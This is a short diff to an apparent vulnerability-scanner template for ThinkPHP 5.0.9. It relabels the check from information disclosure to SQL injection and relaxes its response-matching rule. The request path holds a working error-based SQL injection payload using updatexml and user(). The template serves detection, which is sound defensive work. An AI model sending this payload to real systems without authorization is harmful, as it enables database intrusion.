@@ -1,7 +1,7 @@
-id: thinkphp-509-information-disclosure
+id: thinkphp-509-sqli
 
 info:
-  name: ThinkPHP 5.0.9 Information Disclosure
+  name: ThinkPHP 5.0.9 SQL Injection
   author: dr_set
   severity: high
   verified: false
@@ -17,5 +17,6 @@ rules:
     request:
       method: GET
       path: "/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1"
-    expression: response.body.bcontains(b'SQLSTATE') && response.body.bcontains(b'XPATH syntax error')
+    expression: |
+      response.body.ibcontains(b'XPATH syntax error')
 expression: r0()
